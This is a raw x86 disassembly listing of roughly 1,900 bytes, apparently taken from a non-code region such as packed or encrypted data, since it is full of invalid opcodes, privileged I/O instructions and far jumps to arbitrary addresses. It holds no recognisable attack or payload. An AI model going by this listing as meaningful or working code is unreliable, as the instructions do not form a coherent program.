  4146b3:	daa    
  4146b4:	sbb    al,0x7c
  4146b6:	and    al,0x4
  4146b8:	clc    
  4146b9:	retf   
  4146ba:	ins    DWORD PTR es:[edi],dx
  4146bb:	mov    cl,0xf4
  4146bd:	inc    ecx
  4146bf:	stos   DWORD PTR es:[edi],eax
  4146c0:	lods   eax,DWORD PTR ds:[esi]
  4146c1:	dec    eax
  4146c2:	mov    edi,0xfbce2fa
  4146c7:	ja     0x4146cc
  4146c9:	out    0xa5,eax
  4146cb:	(bad)  
  4146cc:	mov    bl,0x60
  4146ce:	bound  edx,QWORD PTR [edx]
  4146d0:	mov    ebp,0x84e2c58c
  4146d5:	mov    ah,0xc2
  4146d7:	leave  
  4146d8:	in     al,0xa2
  4146da:	cmp    eax,0xfd008ce1
  4146df:	adc    bh,BYTE PTR [ecx-0x6c30b7d8]
  4146e5:	push   ebp
  4146e6:	sub    al,0x51
  4146e8:	jo     0x4146bc
  4146ea:	sbb    BYTE PTR [eax],bl
  4146ec:	outs   dx,DWORD PTR ss:[esi]
  4146ee:	fadd   st,st(2)
  4146f0:	idiv   DWORD PTR [esi-0x46]
  4146f3:	jo     0x4146ca
  4146f5:	xchg   ecx,eax
  4146f6:	and    BYTE PTR [eax-0x671ad2ad],0x78
  4146fd:	fs dec ecx
  4146ff:	jns    0x41473a
  414701:	mov    ch,0x73
  414703:	out    0xbd,eax
  414705:	gs cmp al,0x97
  414708:	jle    0x414731
  41470a:	jge    0x4146a3
  41470c:	mov    bh,0xc8
  41470e:	psrad  mm5,QWORD PTR [ecx+0x3b]
  414712:	fdivrp st(3),st
  414714:	pop    esp
  414715:	fprem  
  414717:	jnp    0x41476b
  414719:	xor    DWORD PTR [edx+0x5aac3c17],esp
  41471f:	bound  esp,QWORD PTR [esi+0x665cff00]
  414725:	gs mov ah,0x38
  414728:	cmc    
  414729:	daa    
  41472a:	inc    ecx
  41472b:	std    
  41472c:	(bad)  
  41472d:	aas    
  41472e:	adc    al,0xf8
  414730:	dec    edx
  414731:	xchg   ecx,edx
  414733:	dec    ebp
  414734:	(bad)  
  414735:	fdivrp st(1),st
  414737:	adc    BYTE PTR [edi+0x53],dl
  41473a:	sbb    eax,0xba8033da
  41473f:	push   ecx
  414740:	aam    0x60
  414742:	mov    bh,0xc7
  414744:	xchg   esp,eax
  414745:	inc    ecx
  414746:	adc    dh,ah
  414748:	daa    
  414749:	mov    al,0x89
  41474b:	movzx  esi,WORD PTR [edx+0x5d707887]
  414752:	push   0x5
  414754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414755:	cmp    DWORD PTR [edx-0x47fae030],esp
  41475b:	out    0xa4,al
  41475d:	jae    0x414720
  41475f:	adc    dl,BYTE PTR [ebx]
  414761:	cmp    BYTE PTR [eax-0x110218be],ah
  414767:	shr    ah,cl
  414769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41476a:	sar    BYTE PTR [ecx+ecx*4],1
  41476d:	lahf   
  41476e:	inc    ecx
  41476f:	icebp  
  414770:	bound  ecx,QWORD PTR cs:[ebx+ecx*1-0x23]
  414775:	sub    eax,ebx
  414777:	mov    edi,0xeea4ffea
  41477c:	xlat   BYTE PTR ds:[ebx]
  41477d:	rol    DWORD PTR [edx+ebx*2-0x33],1
  414781:	out    dx,eax
  414782:	dec    esi
  414783:	call   0xc75b:0x7d63b11b
  41478a:	jle    0x414801
  41478c:	inc    ebp
  41478d:	call   0x1236:0x12260cef
  414794:	pop    ss
  414795:	rep outs dx,DWORD PTR ds:[esi]
  414797:	cmp    eax,0x1a26e2b
  41479c:	xor    BYTE PTR [esi+0x7e1f478d],dl
  4147a2:	adc    esi,DWORD PTR [ecx+0x7]
  4147a5:	shr    DWORD PTR [esp+edi*4],1
  4147a8:	addr16 push esi
  4147aa:	adc    edi,esp
  4147ac:	addr16 inc ebx
  4147ae:	xchg   edx,eax
  4147af:	mov    ds:0xd19014bc,al
  4147b4:	mov    ebx,0xf5760e40
  4147b9:	xchg   ebp,eax
  4147ba:	sub    BYTE PTR [ebx-0x21],al
  4147bd:	inc    DWORD PTR [edi+ebp*8+0x1b]
  4147c1:	outs   dx,BYTE PTR ds:[esi]
  4147c2:	add    al,0x8f
  4147c4:	adc    DWORD PTR [ebp-0x31],0xffffffe1
  4147c8:	scas   al,BYTE PTR es:[edi]
  4147c9:	retf   
  4147ca:	rcl    eax,cl
  4147cc:	and    cl,cl
  4147ce:	mov    eax,ds:0x375734a
  4147d3:	pop    ds
  4147d4:	jbe    0x4147ff
  4147d6:	and    esp,esi
  4147d8:	dec    ebx
  4147d9:	mov    ecx,0xa722986d
  4147de:	pop    ds
  4147df:	fmul   DWORD PTR [ebx-0x48]
  4147e2:	jns    0x414809
  4147e4:	jmp    DWORD PTR [ebx+0x49]
  4147e7:	cli    
  4147e8:	xchg   ebx,eax
  4147e9:	mov    esi,DWORD PTR [ecx-0x37]
  4147ec:	(bad)  
  4147ed:	pop    edi
  4147ee:	sbb    bl,BYTE PTR [ebp-0x5f]
  4147f1:	push   ebp
  4147f2:	xchg   edi,eax
  4147f3:	cli    
  4147f4:	push   esp
  4147f5:	mov    BYTE PTR [ebx+0x43],ch
  4147f8:	test   BYTE PTR [edx-0xa],al
  4147fb:	xor    al,0xd9
  4147fd:	jg     0x414873
  4147ff:	fbld   TBYTE PTR [eax-0x2f2baccb]
  414805:	popa   
  414806:	and    eax,0x8e86a3b5
  41480b:	rcr    DWORD PTR [edi-0x2acedd99],cl
  414811:	test   DWORD PTR [ebx+0x7f],esi
  414814:	adc    al,0x59
  414816:	jns    0x4147b6
  414818:	call   0x9f57:0x190661c2
  41481f:	xchg   WORD PTR [ebx+esi*2-0x3a],sp
  414824:	dec    ebx
  414825:	inc    edx
  414826:	jae    0x41486b
  414828:	rcl    BYTE PTR [edi-0x13e18cc7],cl
  41482e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41482f:	in     eax,dx
  414830:	ss jg  0x414885
  414833:	push   cs
  414834:	jle    0x414854
  414836:	cdq    
  414837:	xchg   ah,bl
  414839:	iret   
  41483a:	call   eax
  41483c:	cmc    
  41483d:	leave  
  41483e:	mov    ebx,DWORD PTR [eax]
  414840:	dec    eax
  414841:	fcom   QWORD PTR [esi-0x52eaa8b2]
  414847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414848:	dec    esp
  414849:	and    al,0xbb
  41484b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41484c:	fmul   st,st(1)
  41484e:	sub    eax,0x564fa6e9
  414853:	and    DWORD PTR [edi+0x76],edx
  414856:	sbb    bl,BYTE PTR [ebx]
  414858:	mov    ecx,0x59de9b2f
  41485d:	pusha  
  41485e:	bound  edx,QWORD PTR [esi+0x20]
  414861:	sub    al,0x40
  414863:	pop    ss
  414864:	dec    ebp
  414865:	or     DWORD PTR [ebx],ecx
  414867:	mov    eax,ds:0xbc0aa3ed
  41486c:	out    0xcb,al
  41486e:	repz clc 
  414870:	adc    bl,BYTE PTR [ecx]
  414872:	push   es
  414873:	inc    ebp
  414874:	xchg   ebp,eax
  414875:	push   ds
  414876:	xor    DWORD PTR [edi-0x554a1dd],edx
  41487c:	sbb    eax,0x91e915c8
  414881:	dec    eax
  414882:	pop    ss
  414883:	hlt    
  414884:	scas   al,BYTE PTR es:[edi]
  414885:	dec    esi
  414886:	inc    eax
  414887:	pusha  
  414888:	mov    edi,0xe107139f
  41488d:	xor    eax,DWORD PTR [ecx+0x2b]
  414890:	xlat   BYTE PTR ds:[ebx]
  414891:	retf   
  414892:	adc    ebx,DWORD PTR [edi-0x7ae1bcee]
  414898:	push   cs
  414899:	mov    ebp,0xdabdea2b
  41489e:	in     al,dx
  41489f:	add    dh,BYTE PTR [ecx-0x54]
  4148a2:	(bad)  
  4148a3:	loopne 0x414858
  4148a5:	ret    0x8549
  4148a8:	sbb    ch,dl
  4148aa:	(bad)  [ebp-0x3344b34a]
  4148b0:	lods   eax,DWORD PTR ds:[esi]
  4148b1:	int    0xb0
  4148b3:	push   ebx
  4148b4:	fidivr DWORD PTR [esi]
  4148b6:	xchg   BYTE PTR [ecx],dh
  4148b8:	dec    ebp
  4148b9:	hlt    
  4148ba:	dec    edi
  4148bb:	cmp    eax,0x13288df2
  4148c0:	adc    edi,0xffffffe8
  4148c3:	pop    esp
  4148c4:	lds    ecx,FWORD PTR [edi+ecx*2]
  4148c7:	leave  
  4148c8:	xor    bl,BYTE PTR [eax+edi*8+0x64563d93]
  4148cf:	lea    esp,[ebp+0x50de2ac9]
  4148d5:	xchg   edx,eax
  4148d6:	adc    BYTE PTR [ebx+0x1c],dh
  4148d9:	mov    eax,ds:0xade91cef
  4148de:	mov    ds:0x80c18aa8,al
  4148e3:	inc    ebx
  4148e4:	or     edx,DWORD PTR [edx-0xef4895e]
  4148ea:	sbb    eax,0xf1b531e3
  4148ef:	je     0x414946
  4148f1:	inc    esi
  4148f2:	out    0x83,eax
  4148f4:	out    0x20,al
  4148f6:	push   ss
  4148f7:	or     eax,0xb346f851
  4148fc:	adc    dl,dl
  4148fe:	(bad)  
  4148ff:	sub    BYTE PTR [esi-0x1213f315],ah
  414905:	(bad)
  414908:	daa    
  414909:	pop    ss
  41490a:	(bad)  
  41490b:	jae    0x4148e4
  41490d:	sub    al,0xe0
  41490f:	add    DWORD PTR [eax+0x2d],edi
  414912:	cs inc eax
  414914:	lods   al,BYTE PTR ds:[esi]
  414915:	pop    eax
  414916:	xchg   edx,eax
  414917:	xchg   esi,eax
  414918:	mov    ss,WORD PTR [eax-0x74d54446]
  41491e:	xchg   ebp,eax
  41491f:	adc    bl,0x87
  414922:	sti    
  414923:	ja     0x41499c
  414925:	xchg   ecx,eax
  414926:	pop    eax
  414927:	xor    BYTE PTR es:[esi-0x34f664e6],ah
  41492e:	into   
  41492f:	xchg   esp,eax
  414930:	lock lods al,BYTE PTR ds:[esi]
  414932:	mov    dl,0xd2
  414934:	retf   
  414935:	fwait
  414936:	inc    ecx
  414937:	push   eax
  414938:	mov    ch,0xce
  41493a:	data16 and al,0x1f
  41493d:	adc    al,0xd
  41493f:	pushf  
  414940:	sbb    BYTE PTR [esp+ebp*2-0x55],ch
  414944:	mov    edi,0xae389312
  414949:	jae    0x41492e
  41494b:	jns    0x414967
  41494d:	and    DWORD PTR es:[edx-0x4],esi
  414951:	pusha  
  414952:	mov    al,ds:0x2ca44a4f
  414957:	nop
  414958:	cwde   
  414959:	mov    eax,0xbce2e440
  41495e:	inc    ebx
  41495f:	(bad)  
  414960:	cmp    al,BYTE PTR [edi]
  414962:	loop   0x414932
  414964:	es dec eax
  414966:	jnp    0x414937
  414968:	mov    ebx,0xaae3b991
  41496d:	mov    ds:0xc7f39a4,eax
  414972:	ins    DWORD PTR es:[edi],dx
  414973:	lahf   
  414974:	xor    edi,DWORD PTR [ebx-0x3c]
  414977:	outs   dx,DWORD PTR ds:[esi]
  414978:	les    esp,FWORD PTR [ecx+0xbd4f86]
  41497e:	mov    BYTE PTR [eax],bh
  414980:	(bad)  
  414981:	xchg   ebx,eax
  414982:	ss jp  0x414928
  414985:	shl    edi,0xef
  414988:	push   ebp
  414989:	pop    ecx
  41498a:	enter  0x90af,0xd4
  41498e:	and    ebx,DWORD PTR [ebx+0x34]
  414991:	inc    esi
  414992:	bound  edi,QWORD PTR es:[ecx]
  414995:	rcl    DWORD PTR [ecx],1
  414997:	xor    edx,0x4f
  41499a:	mov    edx,0x94484ef9
  41499f:	inc    esp
  4149a0:	sub    ebx,DWORD PTR [edx+ecx*4+0x606e3eaa]
  4149a7:	mov    ah,0x60
  4149a9:	xchg   esi,eax
  4149aa:	retf   0x9d7b
  4149ad:	sub    esp,DWORD PTR [edi+0xb9f6192]
  4149b3:	jmp    0x77eb9d07
  4149b8:	cmp    al,0x47
  4149ba:	loope  0x414a17
  4149bc:	(bad)  
  4149bd:	jge    0x4149ae
  4149bf:	imul   esi,DWORD PTR [edi+ecx*4+0x74],0xd7f980fd
  4149c7:	ds in  al,0x5b
  4149ca:	jne    0x4149d5
  4149cc:	popf   
  4149cd:	adc    eax,0x76c000cd
  4149d2:	adc    ah,BYTE PTR [esp+edi*1-0x4161b833]
  4149d9:	scas   al,BYTE PTR es:[edi]
  4149da:	mov    eax,ds:0x3d70e29c
  4149df:	xor    BYTE PTR [edi],bh
  4149e1:	xchg   ebx,eax
  4149e2:	or     DWORD PTR [esi+0x5],ecx
  4149e5:	inc    eax
  4149e6:	rol    DWORD PTR [edi],cl
  4149e8:	cld    
  4149e9:	test   eax,0x3c23904d
  4149ee:	dec    ebx
  4149ef:	icebp  
  4149f0:	std    
  4149f1:	test   eax,0x21a0b1ef
  4149f6:	mov    dh,0x8
  4149f8:	xchg   DWORD PTR [ebx+0x15326c46],ebp
  4149fe:	scas   eax,DWORD PTR es:[edi]
  4149ff:	xor    DWORD PTR [esi+0x64],0x38
  414a03:	out    dx,eax
  414a04:	sub    BYTE PTR ds:0xa924c172,dl
  414a0a:	mov    edx,0xe82503b9
  414a0f:	adc    ebp,0x2
  414a12:	out    dx,eax
  414a13:	xchg   ebp,eax
  414a14:	or     al,0x67
  414a16:	cwde   
  414a17:	adc    BYTE PTR [edx],dl
  414a19:	enter  0x5423,0xa5
  414a1d:	pop    es
  414a1e:	inc    ebp
  414a1f:	and    BYTE PTR [edi+0x55],al
  414a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a23:	jne    0x414a83
  414a25:	fdivr  QWORD PTR [ecx]
  414a27:	jmp    0x4149dd
  414a29:	and    al,0x22
  414a2b:	imul   ebp,DWORD PTR [esp+ecx*4+0x51],0x2c
  414a30:	jl     0x414a36
  414a32:	or     BYTE PTR [ebp+0x23],dl
  414a35:	iret   
  414a36:	lahf   
  414a37:	aas    
  414a38:	dec    esi
  414a39:	sahf   
  414a3a:	sbb    eax,0x3b1d653c
  414a3f:	out    0x40,al
  414a41:	psubusb mm3,QWORD PTR [edx+0x6b3118bb]
  414a48:	mov    edx,eax
  414a4a:	(bad)  
  414a4c:	mov    ebp,0x39cd0d93
  414a51:	fmul   QWORD PTR [ebp-0x27]
  414a54:	sub    BYTE PTR [ebx+ebp*8+0x63],dl
  414a58:	inc    eax
  414a59:	fdiv   QWORD PTR [ebx]
  414a5b:	ds out 0x51,al
  414a5e:	fwait
  414a5f:	or     dh,ch
  414a61:	xor    edi,DWORD PTR [edi-0x244fc16b]
  414a67:	xchg   ebp,eax
  414a68:	push   es
  414a69:	adc    edi,DWORD PTR [ecx]
  414a6b:	push   esi
  414a6c:	xor    eax,ebx
  414a6e:	dec    esp
  414a6f:	stos   BYTE PTR es:[edi],al
  414a70:	rcl    DWORD PTR [ebp+ebp*8-0x4f0d0dc6],1
  414a77:	jno    0x414a2f
  414a79:	shl    eax,1
  414a7b:	jae    0x414a20
  414a7d:	aad    0xc7
  414a7f:	sub    edi,edi
  414a81:	and    edx,DWORD PTR [eax-0x4]
  414a84:	imul   esi,DWORD PTR [esi+edx*8+0x6d],0x8
  414a89:	xchg   ecx,eax
  414a8a:	adc    eax,DWORD PTR [edi]
  414a8c:	mov    WORD PTR [ebx],?
  414a8e:	push   edx
  414a8f:	push   ss
  414a90:	pop    es
  414a91:	jb     0x414adc
  414a93:	xchg   esi,eax
  414a94:	out    0xa2,al
  414a96:	in     eax,dx
  414a97:	push   ebp
  414a98:	sub    al,0x69
  414a9a:	xchg   edx,eax
  414a9b:	retf   0x8402
  414a9e:	mov    eax,0x2f1dfc07
  414aa3:	sbb    al,0xcf
  414aa5:	xor    eax,0xc2fec3b6
  414aaa:	loope  0x414ac2
  414aac:	adc    BYTE PTR [ebx+0x1b9dbc52],0x2e
  414ab3:	fst    DWORD PTR [ebx]
  414ab5:	das    
  414ab6:	loopne 0x414abc
  414ab8:	scas   eax,DWORD PTR es:[edi]
  414ab9:	sahf   
  414aba:	xchg   edx,eax
  414abb:	aaa    
  414abc:	cdq    
  414abd:	push   0xbd9c491
  414ac2:	lock (bad) 
  414ac4:	pop    edi
  414ac5:	out    dx,al
  414ac6:	(bad)  
  414ac7:	jne    0x414a7a
  414ac9:	(bad)
  414acd:	cvtpi2ps xmm0,QWORD PTR [ecx-0x5e]
  414ad1:	mul    BYTE PTR [ebx]
  414ad3:	add    BYTE PTR ds:0x401983d3,0x55
  414ada:	fstp   QWORD PTR [edi-0x7e4163e2]
  414ae0:	add    al,0xba
  414ae2:	repz jns 0x414ac5
  414ae5:	les    edx,FWORD PTR [ebx]
  414ae7:	(bad)  
  414ae8:	ret    
  414ae9:	aaa    
  414aea:	inc    ecx
  414aeb:	(bad)  
  414aed:	xchg   edx,eax
  414aee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aef:	inc    edx
  414af0:	jmp    0x67ed:0xab59278b
  414af7:	lods   eax,DWORD PTR ds:[esi]
  414af8:	inc    edi
  414af9:	fs stos DWORD PTR es:[edi],eax
  414afb:	add    BYTE PTR [esi],dl
  414afd:	dec    ebp
  414afe:	loopne 0x414ab3
  414b00:	test   eax,0x103c3015
  414b05:	aaa    
  414b06:	das    
  414b07:	ret    
  414b08:	sti    
  414b09:	cwde   
  414b0a:	test   BYTE PTR fs:[ebx+0x32],bl
  414b0e:	cld    
  414b0f:	pop    edi
  414b10:	xchg   ecx,eax
  414b11:	fsubr  st(1),st
  414b13:	pop    esi
  414b14:	jnp    0x414b63
  414b16:	and    eax,0x30f7d040
  414b1b:	enter  0xb73f,0x65
  414b1f:	iret   
  414b20:	fisub  DWORD PTR [esi+0x7c3a8185]
  414b26:	enter  0xfcc4,0xd3
  414b2a:	sub    eax,eax
  414b2c:	clc    
  414b2d:	dec    ecx
  414b2e:	adc    BYTE PTR [eax+edi*2+0x8544056],0x13
  414b36:	pusha  
  414b37:	sbb    dh,BYTE PTR [ecx+0x3d6ed385]
  414b3d:	shl    esi,cl
  414b3f:	(bad)  
  414b40:	push   edi
  414b41:	sub    DWORD PTR [edx+0x5ddfe8f1],ebp
  414b47:	add    al,0x37
  414b49:	mov    ebx,0x7d6597e6
  414b4e:	in     eax,dx
  414b4f:	outs   dx,BYTE PTR ds:[esi]
  414b50:	(bad)  
  414b51:	pusha  
  414b52:	fsubr  st,st(7)
  414b54:	call   0x3f089056
  414b59:	mov    ecx,0xd1820011
  414b5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b60:	mov    edi,0x1ec77e47
  414b65:	popf   
  414b66:	xor    DWORD PTR [ecx],0x75
  414b69:	sub    BYTE PTR [edx+0x4fce6123],ah
  414b6f:	shl    DWORD PTR [ebx-0x22],1
  414b72:	mov    eax,ds:0x6c980b7c
  414b77:	sbb    ah,dh
  414b79:	pop    edi
  414b7a:	repnz vpgatherqd xmm0,DWORD PTR [esi],xmm2
  414b80:	add    DWORD PTR [ebx+0x4d12022],esi
  414b86:	icebp  
  414b87:	aas    
  414b88:	lds    esi,FWORD PTR [edx]
  414b8a:	loopne 0x414b75
  414b8c:	jbe    0x414b88
  414b8e:	jecxz  0x414b3b
  414b90:	ins    DWORD PTR es:[edi],dx
  414b91:	and    DWORD PTR [edi],ebx
  414b93:	sar    DWORD PTR [edi],cl
  414b95:	dec    eax
  414b96:	jmp    0x414b21
  414b98:	and    esp,esp
  414b9a:	mov    WORD PTR fs:[edi-0x1],ds
  414b9e:	add    al,0xce
  414ba0:	out    0xc3,eax
  414ba2:	push   ebx
  414ba3:	pop    es
  414ba4:	setbe  BYTE PTR [ebx]
  414ba7:	mov    DWORD PTR ds:0xf6b27ade,edx
  414bad:	jmp    0x414b8c
  414baf:	push   ebp
  414bb0:	and    eax,0x4c4d1b68
  414bb5:	mov    ah,0xcf
  414bb7:	xchg   ebx,eax
  414bb8:	sub    ecx,ebp
  414bba:	retf   
  414bbb:	out    dx,al
  414bbc:	mov    ecx,0x751efe3
  414bc1:	outs   dx,BYTE PTR ds:[esi]
  414bc2:	add    edi,edx
  414bc4:	mov    bl,0xed
  414bc6:	mov    esp,0xaacf5ad0
  414bcb:	pop    ds
  414bcc:	jmp    0x414ba5
  414bce:	mov    esp,0x362970e5
  414bd3:	ss retf 0x2e28
  414bd7:	mov    es,ebx
  414bd9:	push   ebp
  414bda:	dec    edi
  414bdb:	and    DWORD PTR [ebp+0x4b],0x4f
  414bdf:	aam    0xb1
  414be1:	retf   
  414be2:	(bad)  
  414be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414be4:	sub    esp,DWORD PTR [ecx+0x8]
  414be7:	pop    edx
  414be8:	fst    st(2)
  414bea:	sub    ebx,DWORD PTR [ebp-0x37]
  414bed:	jg     0x414be7
  414bef:	enter  0xf93a,0xc1
  414bf3:	push   0x20
  414bf5:	sub    al,0x45
  414bf7:	sbb    eax,0x5edb0e00
  414bfc:	sbb    BYTE PTR [eax+0x7d],dh
  414bff:	lahf   
  414c00:	mov    cl,0x89
  414c02:	adc    DWORD PTR [edx],ebp
  414c04:	(bad)  
  414c05:	sbb    BYTE PTR [ebx+0x7ae5010d],bl
  414c0b:	mov    ch,0x61
  414c0d:	mov    ds:0xafa5a6bf,al
  414c12:	add    esi,ebx
  414c14:	rol    DWORD PTR [ebx-0x345b367f],cl
  414c1a:	cmp    eax,0xf679f5cc
  414c1f:	test   eax,0x36317c5f
  414c24:	mov    ch,0x8a
  414c26:	sbb    BYTE PTR [ecx-0x15],al
  414c29:	adc    DWORD PTR [esi+0x47d8fa55],esi
  414c2f:	xor    DWORD PTR [edx],0xffffffe8
  414c32:	(bad)  
  414c33:	push   ebp
  414c34:	loop   0x414c17
  414c36:	fucomip st,st(0)
  414c38:	repz cmp edi,edi
  414c3b:	jl     0x414c21
  414c3d:	jo     0x414c3d
  414c3f:	sbb    ah,dl
  414c41:	dec    esp
  414c42:	leave  
  414c43:	or     edx,DWORD PTR [edi+0x64]
  414c46:	jne    0x414c49
  414c48:	cmp    eax,0x314503bd
  414c4d:	mov    dl,0x9c
  414c4f:	add    DWORD PTR [eax-0x38381b4],eax
  414c55:	div    DWORD PTR [ebx-0x35]
  414c58:	cs cmp al,0xfc
  414c5b:	jo     0x414cda
  414c5d:	jle    0x414ca7
  414c5f:	lods   al,BYTE PTR ds:[esi]
  414c60:	xor    al,0x6
  414c62:	outs   dx,BYTE PTR ds:[esi]
  414c63:	xor    ah,cl
  414c65:	mov    esi,0x25f0938c
  414c6a:	mov    ch,0xe8
  414c6c:	lea    eax,[ebx-0x38762195]
  414c72:	or     eax,0x27e804c4
  414c77:	jnp    0x414ca8
  414c79:	js     0x414c6b
  414c7b:	out    dx,al
  414c7c:	dec    esp
  414c7d:	mov    ds:0x98d7e157,eax
  414c82:	inc    eax
  414c83:	push   0x46
  414c85:	pop    ecx
  414c86:	pop    ebp
  414c87:	dec    ecx
  414c88:	mov    eax,ds:0x81337a9c
  414c8d:	das    
  414c8e:	aas    
  414c8f:	sbb    esp,esi
  414c91:	mul    BYTE PTR [edi+0x58fd25a9]
  414c97:	in     al,dx
  414c98:	stc    
  414c99:	bnd jp 0x414ca8
  414c9c:	xchg   esp,eax
  414c9d:	dec    edx
  414c9e:	xor    cl,ch
  414ca0:	mov    cl,0xf9
  414ca2:	push   0xffffff81
  414ca4:	push   0x96714f5f
  414ca9:	inc    ebx
  414caa:	mov    ch,0x32
  414cac:	retf   0x523d
  414caf:	push   cs
  414cb0:	or     esi,DWORD PTR [edx-0x68fa4dfe]
  414cb6:	or     dl,ch
  414cb8:	mov    dl,0xc3
  414cba:	fsub   DWORD PTR [edx]
  414cbc:	iret   
  414cbd:	in     al,dx
  414cbe:	aad    0xfa
  414cc0:	xchg   edx,eax
  414cc1:	fisttp WORD PTR [ebp-0x40]
  414cc4:	fsub   st,st(5)
  414cc6:	inc    edx
  414cc7:	pop    ds
  414cc8:	mov    ah,0x4b
  414cca:	jne    0x414c53
  414ccc:	adc    BYTE PTR [eax-0x66],al
  414ccf:	mov    ebx,0xec062b5a
  414cd4:	mov    WORD PTR [eax-0x28823828],fs
  414cda:	arpl   WORD PTR [esi-0x6e0665ab],bp
  414ce0:	push   0xfffffff5
  414ce2:	mov    al,ds:0x93ebbffe
  414ce7:	sub    eax,ebp
  414ce9:	push   ebp
  414cea:	iret   
  414ceb:	dec    eax
  414cec:	jae    0x414c6e
  414cee:	lock cmp ebp,0x2d5aad29
  414cf5:	mov    ah,0x90
  414cf7:	sar    BYTE PTR [ebp-0x32],0xc6
  414cfb:	xor    dh,BYTE PTR ds:0xee36e2e4
  414d01:	pop    ds
  414d02:	xor    esi,DWORD PTR [edi]
  414d04:	mov    WORD PTR [eax-0x53],?
  414d07:	aaa    
  414d08:	fcmovnu st,st(1)
  414d0a:	sti    
  414d0b:	cmp    bh,BYTE PTR [esi-0xc]
  414d0e:	mov    cl,0x29
  414d10:	data16 gs aaa 
  414d13:	nop
  414d14:	imul   edx,DWORD PTR [edi],0x75
  414d17:	fidiv  DWORD PTR [edx]
  414d19:	inc    eax
  414d1a:	frstor [ebp+0x4c57ea04]
  414d20:	stc    
  414d21:	clc    
  414d22:	mov    bl,0xe2
  414d24:	shl    ch,0x38
  414d27:	loope  0x414d6b
  414d29:	xor    bh,bl
  414d2b:	repz fwait
  414d2d:	loope  0x414ced
  414d2f:	lea    esp,[edi+0x2520daff]
  414d35:	fwait
  414d36:	std    
  414d37:	and    ah,dh
  414d39:	and    ah,dh
  414d3b:	sub    eax,0x89a1ab99
  414d40:	gs stc 
  414d42:	cmp    BYTE PTR [ecx+0x2c4576d7],0xf3
  414d49:	or     ecx,esp
  414d4b:	push   ss
  414d4c:	adc    ah,BYTE PTR [ebx+0x693f6c5c]
  414d52:	jmp    0xec11:0x1be93520
  414d59:	daa    
  414d5a:	ins    BYTE PTR es:[edi],dx
  414d5b:	rcl    DWORD PTR [edi+0x74f6064],0x4c
  414d62:	pusha  
  414d63:	push   ds
  414d64:	ror    esi,1
  414d66:	out    0x83,eax
  414d68:	mov    dh,0x22
  414d6a:	push   ds
  414d6b:	add    al,0x6a
  414d6d:	mov    dh,0xb9
  414d6f:	(bad)  
  414d70:	xor    ebx,DWORD PTR [ebx+edx*1]
  414d73:	sub    ebx,ecx
  414d75:	and    eax,DWORD PTR [ebx+0x1ec5cec7]
  414d7b:	mov    ch,0xe5
  414d7d:	lahf   
  414d7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d7f:	pop    ebp
  414d80:	adc    edx,edx
  414d82:	out    dx,al
  414d83:	adc    eax,0x8b1e3419
  414d88:	adc    DWORD PTR fs:[eax-0xb],edi
  414d8c:	xor    DWORD PTR [edx],0xabf1987e
  414d92:	mov    es,WORD PTR es:[edx+edx*2+0x1bb8452e]
  414d9a:	mov    al,ds:0x2a55eba0
  414d9f:	xchg   ebp,eax
  414da0:	call   0x43bd:0xa481e070
  414da7:	inc    eax
  414da8:	mov    ecx,0x23f3d6e0
  414dad:	pop    edx
  414dae:	jmp    0xcba4a3ca
  414db3:	jmp    0xfbe5:0x4670445c
  414dba:	out    dx,al
  414dbb:	xor    al,0xd3
  414dbd:	out    0xe7,al
  414dbf:	sbb    ebp,DWORD PTR [esi+0x4f39f570]
  414dc5:	push   0x5e
  414dc7:	in     al,dx
  414dc8:	outs   dx,DWORD PTR ds:[esi]
  414dc9:	xor    cl,BYTE PTR [ebx+0x12]
  414dcc:	sub    bl,ah
  414dce:	and    esp,DWORD PTR [esp+ebx*2+0x6acafafe]
  414dd5:	sbb    DWORD PTR [ebx-0x3d],ebp
  414dd8:	pop    es
  414dd9:	shl    DWORD PTR [esi+0x119b614a],cl
  414ddf:	jae    0x414db0
  414de1:	push   ebx
  414de2:	mov    dh,0x93
  414de4:	push   ss
  414de5:	jne    0x414de8
  414de7:	mov    DWORD PTR [edx],ebp
  414de9:	jmp    0xd74cca92
  414dee:	jg     0x414d9b
  414df0:	pop    edx
  414df1:	pop    es
  414df2:	mov    eax,0x3384a780
  414df7:	add    al,0xff
  414df9:	fild   QWORD PTR [ebx+0x1c]
  414dfc:	and    eax,0x8811ba6d
  414e01:	push   cs
  414e02:	add    edx,DWORD PTR [ecx-0x3ad3dd06]
  414e08:	cs cli 
  414e0a:	les    ebp,FWORD PTR [ebx+0x407734e6]
  414e10:	or     BYTE PTR [ecx+0x6f],0x98
  414e14:	inc    ecx
  414e15:	(bad)  
  414e16:	in     eax,0x35
  414e18:	xchg   ebx,eax
  414e19:	or     DWORD PTR [ebx-0x3a],edx
  414e1c:	dec    edi
  414e1d:	xor    edx,DWORD PTR ds:0x6addf0ee
  414e23:	add    ebp,DWORD PTR [ecx+eax*1+0x3c]
  414e27:	rol    ch,0x62
  414e2a:	cmp    edx,DWORD PTR [ebp-0x21]
  414e2d:	cs repz jl 0x414e74
  414e31:	pusha  
  414e32:	ret    
  414e33:	(bad)  
  414e34:	int    0x5e
  414e36:	aas    
  414e37:	push   ecx
  414e38:	cmc    
  414e39:	inc    esp
  414e3a:	pop    ebp
  414e3b:	lods   al,BYTE PTR ds:[esi]
  414e3c:	sar    BYTE PTR [esi-0x5c],0xaf
  414e40:	pop    edi
  414e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e42:	retf   
  414e43:	xchg   BYTE PTR [ebp-0x58eb0ffc],bl
  414e49:	add    DWORD PTR [eax],ebp
  414e4b:	xchg   BYTE PTR ds:0x114f429a,dh
  414e51:	jmp    0x4ab6:0xbe20d64f
  414e58:	mov    WORD PTR [ecx+edi*4-0x3999442f],gs
  414e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e60:	imul   ecx,eax,0x57
  414e63:	ret    
  414e64:	or     bl,BYTE PTR [eax+0x3ff78f28]
